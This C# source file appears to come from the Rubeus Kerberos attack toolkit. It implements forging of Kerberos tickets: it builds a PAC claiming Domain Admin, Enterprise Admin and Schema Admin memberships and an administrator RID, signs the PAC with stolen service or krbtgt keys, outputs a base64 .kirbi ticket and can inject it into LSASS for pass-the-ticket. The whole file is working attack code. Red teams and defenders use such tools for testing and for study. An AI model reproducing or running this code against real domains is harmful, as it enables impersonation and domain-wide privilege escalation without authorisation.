using System;
using System.Text;
using System.Security.Principal;
using System.Collections.Generic;
using System.Linq;
using System.Globalization;
using System.DirectoryServices;
using Rubeus.lib.Interop;
using Rubeus.Kerberos.PAC;
using Rubeus.Kerberos;

namespace Rubeus
{
    public class ForgeTickets
    {
        public static void ForgeTicket(string user, string sname, byte[] serviceKey, Interop.KERB_ETYPE etype, byte[] krbKey = null, Interop.KERB_CHECKSUM_ALGORITHM krbeType = Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_SHA1_96_AES256, bool ldap = false, System.Net.NetworkCredential ldapcred = null, string sid = "", string domain = "", string netbiosName = "", string domainController = "", int uid = 0, string groups = "", string sids = "", string outfile = null, bool ptt = false, Interop.TicketFlags flags = Interop.TicketFlags.forwardable | Interop.TicketFlags.renewable | Interop.TicketFlags.pre_authent, DateTime? startTime = null, DateTime? rangeEnd = null, string rangeInterval = "1d", DateTime? authTime = null, string endTime = "", string renewTill = "")
        {
            // vars
            int c = 0;

            // initialise LogonInfo section and set defaults
            var kvi = Ndr._KERB_VALIDATION_INFO.CreateDefault();
            kvi.EffectiveName = new Ndr._RPC_UNICODE_STRING(user);
            kvi.FullName = new Ndr._RPC_UNICODE_STRING("");
            kvi.HomeDirectory = new Ndr._RPC_UNICODE_STRING("");
            kvi.HomeDirectoryDrive = new Ndr._RPC_UNICODE_STRING("");
            kvi.ProfilePath = new Ndr._RPC_UNICODE_STRING("");
            kvi.LogonScript = new Ndr._RPC_UNICODE_STRING("");
            kvi.LogonServer = new Ndr._RPC_UNICODE_STRING("");
            kvi.UserSessionKey = Ndr._USER_SESSION_KEY.CreateDefault();
            kvi.LogonTime = new Ndr._FILETIME(DateTime.UtcNow);
            kvi.LogoffTime = Ndr._FILETIME.CreateDefault();
            kvi.PasswordLastSet = Ndr._FILETIME.CreateDefault();
            kvi.KickOffTime = Ndr._FILETIME.CreateDefault();
            kvi.PasswordCanChange = Ndr._FILETIME.CreateDefault();
            kvi.PasswordMustChange = Ndr._FILETIME.CreateDefault();
            kvi.LogonCount = 0;
            kvi.BadPasswordCount = 0;
            kvi.UserId = 500;
            if (string.IsNullOrEmpty(groups))
            {
                kvi.GroupCount = 5;
                kvi.GroupIds = new Ndr._GROUP_MEMBERSHIP[] {
                    new Ndr._GROUP_MEMBERSHIP(520, 0),
                    new Ndr._GROUP_MEMBERSHIP(512, 0),
                    new Ndr._GROUP_MEMBERSHIP(513, 0),
                    new Ndr._GROUP_MEMBERSHIP(519, 0),
                    new Ndr._GROUP_MEMBERSHIP(518, 0),
                };
            }
            kvi.UserAccountControl = 528;
            kvi.UserFlags = 32;
            if (String.IsNullOrEmpty(sids))
            {
                kvi.SidCount = 1;
                kvi.ExtraSids = new Ndr._KERB_SID_AND_ATTRIBUTES[] {
                        new Ndr._KERB_SID_AND_ATTRIBUTES(new Ndr._RPC_SID(new SecurityIdentifier("S-1-18-1")), 7)};
            }


            // determine domain if not supplied
            string[] parts = sname.Split('/');
            if (String.IsNullOrEmpty(domain))
            {
                if ((parts.Length > 1) && (parts[0] == "krbtgt"))
                {
                    Console.WriteLine("[X] TGT or referral TGT requires /domain to be passed.");
                    return;
                }
                else if ((parts.Length == 1) && (sname.Split('@').Length == 1))
                {
                    Console.WriteLine("[X] SPN has to be in the format 'svc/host.domain.com' or 'host@domain.com'.");
                    return;
                }
                else if (parts.Length > 1)
                {
                    domain = parts[1].Substring(parts[1].IndexOf('.') + 1);
                    string[] domainParts = domain.Split(':');
                    if (domainParts.Length > 1)
                    {
                        domain = domainParts[0];
                    }
                }
                else if (sname.Split('@').Length > 1)
                {
                    domain = sname.Split('@')[1];
                }
                else
                {
                    Console.WriteLine("[X] SPN is in a unsupported format: {0}.", sname);
                    return;
                }
            }
            if (String.IsNullOrEmpty(netbiosName))
            {
                kvi.LogonDomainName = new Ndr._RPC_UNICODE_STRING(domain.Substring(0, domain.IndexOf('.')).ToUpper());
            }

            // if /ldap was passed make the LDAP queries
            if (ldap)
            {
                // try LDAPS and fail back to LDAP
                List<IDictionary<string, Object>> ActiveDirectoryObjects = null;
                bool ssl = true;
                Console.WriteLine("[*] Trying to query LDAP using LDAPS on domain controller {0}", domainController);
                ActiveDirectoryObjects = Networking.GetLdapQuery(ldapcred, "", domainController, domain, String.Format("(samaccountname={0})", user), ssl);
                if (ActiveDirectoryObjects == null)
                {
                    Console.WriteLine("[!] LDAPS failed, retrying with plaintext LDAP.");
                    ssl = false;
                    ActiveDirectoryObjects = Networking.GetLdapQuery(ldapcred, "", domainController, domain, String.Format("(samaccountname={0})", user), ssl);
                }
                if (ActiveDirectoryObjects == null)
                {
                    Console.WriteLine("[X] Error LDAP query failed, unable to create ticket using LDAP.");
                    return;
                }

                foreach (var userObject in ActiveDirectoryObjects)
                {
                    string domainSid = ((string)userObject["objectsid"]).Substring(0, ((string)userObject["objectsid"]).LastIndexOf('-'));
                    string configOU = String.Format("CN=Configuration,DC={0}", domain.Replace(".", ",DC="));

                    List<IDictionary<string, Object>> adObjects = null;

                    if (string.IsNullOrEmpty(groups))
                    {
                        // Try to get group information from LDAP
                        Console.WriteLine("[*] Retrieving group information over LDAP from domain controller {0}", domainController);
                        string groupFilter = "";
                        if (userObject.ContainsKey("memberof"))
                        {
                            foreach (string groupDN in (string[])userObject["memberof"])
                            {
                                groupFilter += String.Format("(distinguishedname={0})", groupDN);
                            }
                            adObjects = Networking.GetLdapQuery(ldapcred, "", domainController, domain, String.Format("(|{0})", groupFilter), ssl);
                            if (adObjects == null)
                            {
                                Console.WriteLine("[!] Unable to get group information using LDAP, using defaults.");
                            }
                            else
                            {
                                kvi.GroupCount = adObjects.Count;
                                kvi.GroupIds = new Ndr._GROUP_MEMBERSHIP[adObjects.Count];
                                c = 0;
                                foreach (var groupObject in adObjects)
                                {
                                    string groupSid = (string)groupObject["objectsid"];
                                    int groupId = Int32.Parse(groupSid.Substring(groupSid.LastIndexOf('-') + 1));
                                    Array.Copy(new Ndr._GROUP_MEMBERSHIP[] { new Ndr._GROUP_MEMBERSHIP(groupId, 7) }, 0, kvi.GroupIds, c, 1);
                                    c += 1;
                                }
                            }
                        }
                        else
                        {
                            kvi.GroupCount = 0;
                            kvi.GroupIds = new Ndr._GROUP_MEMBERSHIP[0];
                        }
                    }

                    if (String.IsNullOrEmpty(netbiosName))
                    {
                        // Try to get netbios name from LDAP
                        Console.WriteLine("[*] Retrieving netbios name over LDAP from domain controller {0}", domainController);
                        adObjects = Networking.GetLdapQuery(ldapcred, configOU, domainController, domain, "(netbiosname = *)", ssl);
                        if (adObjects == null)
                        {
                            Console.WriteLine("[!] Unable to get netbios name using LDAP, using defaults.");
                        }
                        else
                        {
                            foreach (var n in adObjects)
                            {
                                kvi.LogonDomainName = new Ndr._RPC_UNICODE_STRING((string)n["netbiosname"]);
                            }
                        }
                    }

                    // set the rest of the PAC fields
                    if (userObject.ContainsKey("displayname"))
                    {
                        kvi.FullName = new Ndr._RPC_UNICODE_STRING((string)userObject["displayname"]);
                    }
                    if (String.IsNullOrEmpty(sid))
                    {
                        kvi.LogonDomainId = new Ndr._RPC_SID(new SecurityIdentifier(domainSid));
                    }
                    kvi.LogonCount = short.Parse((string)userObject["logoncount"]);
                    kvi.BadPasswordCount = short.Parse((string)userObject["badpwdcount"]);
                    if ((DateTime)userObject["lastlogon"] != DateTime.MinValue)
                    {
                        kvi.LogonTime = new Ndr._FILETIME((DateTime)userObject["lastlogon"]);
                    }
                    if ((DateTime)userObject["lastlogoff"] != DateTime.MinValue)
                    {
                        kvi.LogoffTime = new Ndr._FILETIME((DateTime)userObject["lastlogoff"]);
                    }
                    if ((DateTime)userObject["pwdlastset"] != DateTime.MinValue)
                    {
                        kvi.PasswordLastSet = new Ndr._FILETIME((DateTime)userObject["pwdlastset"]);
                    }
                    kvi.PrimaryGroupId = Int32.Parse((string)userObject["primarygroupid"]);
                    kvi.UserId = Int32.Parse(((string)userObject["objectsid"]).Substring(((string)userObject["objectsid"]).LastIndexOf('-') + 1));
                    if (userObject.ContainsKey("homedirectory"))
                    {
                        kvi.HomeDirectory = new Ndr._RPC_UNICODE_STRING((string)userObject["homedirectory"]);
                    }
                    if (userObject.ContainsKey("homedrive"))
                    {
                        kvi.HomeDirectoryDrive = new Ndr._RPC_UNICODE_STRING((string)userObject["homedrive"]);
                    }
                    if (userObject.ContainsKey("profilepath"))
                    {
                        kvi.ProfilePath = new Ndr._RPC_UNICODE_STRING((string)userObject["profilepath"]);
                    }
                    if (userObject.ContainsKey("scriptpath"))
                    {
                        kvi.LogonScript = new Ndr._RPC_UNICODE_STRING((string)userObject["scriptpath"]);
                    }

                }

            }
            else if (String.IsNullOrEmpty(sid))
            {
                Console.WriteLine("[X] To forge tickets without specifying '/ldap', '/sid' is required.");
                return;
            }

            // initialize some structures
            KRB_CRED cred = new KRB_CRED();
            KrbCredInfo info = new KrbCredInfo();

            Console.WriteLine("[*] Building PAC");

            // overwrite any LogonInfo fields here sections
            if (!String.IsNullOrEmpty(netbiosName))
            {
                kvi.LogonDomainName = new Ndr._RPC_UNICODE_STRING(netbiosName);
            }
            if (!String.IsNullOrEmpty(sid))
            {
                kvi.LogonDomainId = new Ndr._RPC_SID(new SecurityIdentifier(sid));
            }
            if (!String.IsNullOrEmpty(groups))
            {
                int numOfGroups = groups.Split(',').Length;
                kvi.GroupCount = numOfGroups;
                kvi.GroupIds = new Ndr._GROUP_MEMBERSHIP[numOfGroups];
                c = 0;
                foreach (string gid in groups.Split(','))
                {
                    try
                    {
                        Array.Copy(new Ndr._GROUP_MEMBERSHIP[] { new Ndr._GROUP_MEMBERSHIP(Int32.Parse(gid), 7) }, 0, kvi.GroupIds, c, 1);
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine("[X] Error unable to parse group id {0}: {1}", gid, e.Message);
                    }
                    c += 1;
                }
            }
            if (!String.IsNullOrEmpty(sids))
            {
                int numOfSids = sids.Split(',').Length;
                kvi.SidCount = numOfSids;
                kvi.ExtraSids = new Ndr._KERB_SID_AND_ATTRIBUTES[numOfSids];
                c = 0;
                foreach (string s in sids.Split(','))
                {
                    Array.Copy(new Ndr._KERB_SID_AND_ATTRIBUTES[] { new Ndr._KERB_SID_AND_ATTRIBUTES(new Ndr._RPC_SID(new SecurityIdentifier(s)), 7) }, 0, kvi.ExtraSids, c, 1);
                    c += 1;
                }
            }
            if (!String.IsNullOrEmpty(domainController))
            {
                string dcName = Networking.GetDCNameFromIP(domainController);
                if (dcName != null)
                {
                    kvi.LogonServer = new Ndr._RPC_UNICODE_STRING(domainController.Substring(0, domainController.IndexOf('.')).ToUpper());
                }
            }

            // generate a random session key, encryption type and checksum types
            Random random = new Random();
            byte[] randKeyBytes;
            SignatureData svrSigData = new SignatureData(PacInfoBufferType.ServerChecksum);
            SignatureData kdcSigData = new SignatureData(PacInfoBufferType.KDCChecksum);
            int svrSigLength = 12, kdcSigLength = 12;
            if (etype == Interop.KERB_ETYPE.rc4_hmac)
            {
                randKeyBytes = new byte[16];
                random.NextBytes(randKeyBytes);
                svrSigData.SignatureType = Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_MD5;
                kdcSigData.SignatureType = Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_MD5;
                svrSigLength = 16;
                kdcSigLength = 16;
            }
            else if (etype == Interop.KERB_ETYPE.aes256_cts_hmac_sha1)
            {
                randKeyBytes = new byte[32];
                random.NextBytes(randKeyBytes);
                svrSigData.SignatureType = Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_SHA1_96_AES256;
                kdcSigData.SignatureType = Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_SHA1_96_AES256;
            }
            else
            {
                Console.WriteLine("[X] Only rc4_hmac and aes256_cts_hmac_sha1 key hashes supported at this time!");
                return;
            }

            // if the krbtgt key is specified, use the checksum type also specified
            if (krbKey != null)
            {
                kdcSigData.SignatureType = krbeType;
                if ((krbeType == Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_SHA1_96_AES256) || (krbeType == Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_SHA1_96_AES128))
                {
                    kdcSigLength = 12;
                }
                else
                {
                    kdcSigLength = 16;
                }
            }

            // set krbKey to serviceKey if none is given
            if (krbKey == null)
            {
                krbKey = serviceKey;
            }

            // output some ticket information relevent to all tickets generated
            Console.WriteLine("[*] Domain         : {0} ({1})", domain.ToUpper(), kvi.LogonDomainName);
            Console.WriteLine("[*] SID            : {0}", kvi.LogonDomainId?.GetValue());
            Console.WriteLine("[*] UserId         : {0}", kvi.UserId);
            if (kvi.GroupCount > 0)
            {
                Console.WriteLine("[*] Groups         : {0}", kvi.GroupIds?.GetValue().Select(g => g.RelativeId.ToString()).Aggregate((cur, next) => cur + "," + next));
            }
            if (kvi.SidCount > 0)
            {
                Console.WriteLine("[*] ExtraSIDs      : {0}", kvi.ExtraSids.GetValue().Select(s => s.Sid.ToString()).Aggregate((cur, next) => cur + "," + next));
            }
            Console.WriteLine("[*] ServiceKey     : {0}", Helpers.ByteArrayToString(serviceKey));
            Console.WriteLine("[*] ServiceKeyType : {0}", svrSigData.SignatureType);
            Console.WriteLine("[*] KDCKey         : {0}", Helpers.ByteArrayToString(krbKey));
            Console.WriteLine("[*] KDCKeyType     : {0}", kdcSigData.SignatureType);
            Console.WriteLine("[*] Service        : {0}", parts[0]);
            Console.WriteLine("[*] Target         : {0}", parts[1]);
            Console.WriteLine("");

            // loop incase we need to generate multiple tickets as everything below this are effected
            do
            {
                kvi.LogonTime = new Ndr._FILETIME((DateTime)startTime);
                LogonInfo li = new LogonInfo(kvi);


                ClientName cn = new ClientName((DateTime)startTime, user);

                UpnDns upnDns = new UpnDns(1, domain.ToUpper(), String.Format("{0}@{1}", user, domain.ToLower()));

                Console.WriteLine("[*] Generating EncTicketPart");
                EncTicketPart decTicketPart = new EncTicketPart(randKeyBytes, etype, domain.ToUpper(), user, flags, cn.ClientId);

                // set other times in EncTicketPart
                DateTime? check = null;
                decTicketPart.authtime = (DateTime)authTime;
                if (!String.IsNullOrEmpty(endTime))
                {
                    check = Helpers.FurtureDate((DateTime)startTime, endTime);
                    if (check != null)
                    {
                        decTicketPart.endtime = (DateTime)check;
                    }
                }
                if (!String.IsNullOrEmpty(renewTill))
                {
                    check = Helpers.FurtureDate((DateTime)startTime, renewTill);
                    if (check != null)
                    {
                        decTicketPart.renew_till = (DateTime)check;
                    }
                }

                // generate clear signatures
                Console.WriteLine("[*] Signing PAC");
                svrSigData.Signature = new byte[svrSigLength];
                kdcSigData.Signature = new byte[kdcSigLength];
                Array.Clear(svrSigData.Signature, 0, svrSigLength);
                Array.Clear(kdcSigData.Signature, 0, kdcSigLength);

                // add sections to the PAC, get bytes and generate checksums
                List<PacInfoBuffer> PacInfoBuffers = new List<PacInfoBuffer>();
                PacInfoBuffers.Add(li);
                PacInfoBuffers.Add(cn);
                PacInfoBuffers.Add(upnDns);
                PacInfoBuffers.Add(svrSigData);
                PacInfoBuffers.Add(kdcSigData);
                PACTYPE pt = new PACTYPE(0, PacInfoBuffers);
                byte[] ptBytes = pt.Encode();
                byte[] svrSig = Crypto.KerberosChecksum(serviceKey, ptBytes, svrSigData.SignatureType);
                byte[] kdcSig = Crypto.KerberosChecksum(krbKey, svrSig, kdcSigData.SignatureType);

                // add checksums
                svrSigData.Signature = svrSig;
                kdcSigData.Signature = kdcSig;
                PacInfoBuffers = new List<PacInfoBuffer>();
                PacInfoBuffers.Add(li);
                PacInfoBuffers.Add(cn);
                PacInfoBuffers.Add(upnDns);
                PacInfoBuffers.Add(svrSigData);
                PacInfoBuffers.Add(kdcSigData);
                pt = new PACTYPE(0, PacInfoBuffers);

                // add the PAC to the ticket
                decTicketPart.SetPac(pt);


                // encrypt the EncTicketPart
                Console.WriteLine("[*] Encrypting EncTicketPart");
                byte[] encTicketData = decTicketPart.Encode().Encode();
                byte[] encTicketPart = Crypto.KerberosEncrypt(etype, Interop.KRB_KEY_USAGE_AS_REP_TGS_REP, serviceKey, encTicketData);

                // initialize the ticket and add the enc_part
                Console.WriteLine("[*] Generating Ticket");
                Ticket ticket = new Ticket(domain.ToUpper(), sname);
                ticket.enc_part = new EncryptedData((Int32)etype, encTicketPart, 3);

                // add the ticket
                cred.tickets.Add(ticket);

                // [0] add in the session key
                info.key.keytype = (int)etype;
                info.key.keyvalue = randKeyBytes;

                // [1] prealm (domain)
                info.prealm = decTicketPart.crealm;

                // [2] pname (user)
                info.pname.name_type = decTicketPart.cname.name_type;
                info.pname.name_string = decTicketPart.cname.name_string;

                // [3] flags
                info.flags = flags;

                // [4] authtime (not required)
                info.authtime = decTicketPart.authtime;

                // [5] starttime
                info.starttime = decTicketPart.starttime;

                // [6] endtime
                info.endtime = decTicketPart.endtime;

                // [7] renew-till
                info.renew_till = decTicketPart.renew_till;

                // [8] srealm
                info.srealm = ticket.realm;

                // [9] sname
                info.sname.name_type = ticket.sname.name_type;
                info.sname.name_string = ticket.sname.name_string;

                // add the ticket_info into the cred object
                cred.enc_part.ticket_info.Add(info);

                Console.WriteLine("[*] Generated KERB-CRED");



                byte[] kirbiBytes = cred.Encode().Encode();

                string kirbiString = Convert.ToBase64String(kirbiBytes);

                if (parts[0] == "krbtgt")
                {
                    Console.WriteLine("[*] Forged a TGT for '{0}@{1}'", info.pname.name_string[0], domain);
                }
                else
                {
                    Console.WriteLine("[*] Forged a TGS for '{0}' to '{1}'", info.pname.name_string[0], sname);
                }
                Console.WriteLine("");

                // dates unique to this ticket
                Console.WriteLine("[*] AuthTime       : {0}", decTicketPart.authtime.ToLocalTime().ToString(CultureInfo.CurrentCulture));
                Console.WriteLine("[*] StartTime      : {0}", decTicketPart.starttime.ToLocalTime().ToString(CultureInfo.CurrentCulture));
                Console.WriteLine("[*] EndTime        : {0}", decTicketPart.endtime.ToLocalTime().ToString(CultureInfo.CurrentCulture));
                Console.WriteLine("[*] RenewTill      : {0}", decTicketPart.renew_till.ToLocalTime().ToString(CultureInfo.CurrentCulture));

                Console.WriteLine("");

                Console.WriteLine("[*] base64(ticket.kirbi):\r\n");

                if (Program.wrapTickets)
                {
                    // display the .kirbi base64, columns of 80 chararacters
                    foreach (string line in Helpers.Split(kirbiString, 80))
                    {
                        Console.WriteLine("      {0}", line);
                    }
                }
                else
                {
                    Console.WriteLine("      {0}", kirbiString);
                }

                Console.WriteLine("");

                if (!String.IsNullOrEmpty(outfile))
                {
                    DateTime fileTime = (DateTime)startTime;
                    string filename = $"{Helpers.GetBaseFromFilename(outfile)}_{fileTime.ToString("yyyy_MM_dd_HH_mm_ss")}_{info.pname.name_string[0]}_to_{info.sname.name_string[0]}@{info.srealm}{Helpers.GetExtensionFromFilename(outfile)}";
                    filename = Helpers.MakeValidFileName(filename);
                    if (Helpers.WriteBytesToFile(filename, kirbiBytes))
                    {
                        Console.WriteLine("\r\n[*] Ticket written to {0}\r\n", filename);
                    }
                }

                Console.WriteLine("");

                if (ptt)
                {
                    // pass-the-ticket -> import into LSASS
                    LSA.ImportTicket(kirbiBytes, new LUID());
                }

                // increase startTime by rangeInterval
                startTime = Helpers.FurtureDate((DateTime)startTime, rangeInterval);
                if (startTime == null)
                {
                    Console.WriteLine("[!] Invalid /rangeinterval passed, skipping multiple ticket generation: {0}", rangeInterval);
                    startTime = rangeEnd;
                }
                authTime = startTime;

            } while (startTime < rangeEnd);
        }
    }
}
